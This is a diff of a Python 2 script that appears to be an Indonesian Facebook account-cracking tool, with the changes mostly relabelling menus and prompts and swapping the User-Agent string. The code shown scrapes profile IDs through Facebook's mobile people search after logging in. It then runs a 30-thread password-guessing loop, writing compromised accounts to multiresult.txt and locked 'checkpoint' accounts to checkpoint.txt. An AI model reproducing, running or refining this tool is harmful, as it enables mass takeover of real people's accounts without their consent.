@@ -20,7 +20,7 @@ class crack:
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
-			print "!: crack started..."
+			print "!: Sedang di Crack..."
 			print "+: account found saved to: multiresult.txt"
 			print "+: account checkpoint saved to: checkpoint.txt"
 			ThreadPool(30).map(self.main,self.fl)
@@ -40,7 +40,7 @@ class crack:
 					self.cp.append("%s|%s"%(fl,i))
 					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
 			self.ko+=1
-			print "\r[Crack] %s/%s Dapat :%s # CP :%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r[Crack] %s/%s - Dapat-:%s - CP-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 			
@@ -72,19 +72,18 @@ def search(fl,r,b):
 def dumpfl():
 	r=requests.Session()
 	r.get("https://mbasic.facebook.com/login")
-	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 8.0.1; Redmi Vivo Y93) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
+	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
 	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("?: email: "),"pass":raw_input("?: passs: ")}).url
 	if "c_user" in r.cookies.get_dict():
-		fl=raw_input("? Simpan File
-			   ")
-		s=raw_input("?Nama Target")
+		fl=raw_input("?: filename: ")
+		s=raw_input("?: search query: ")
 		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)
 	
 
 
 while True:
-	print "1. Input Nama"
-	print "2. Crack\n"
+	print "[1] Dump ID Lewat Nama"
+	print "[2] Crack\n"
 	r=raw_input("?: pilih: ")
 	if r=="":
 		os.system("clear")
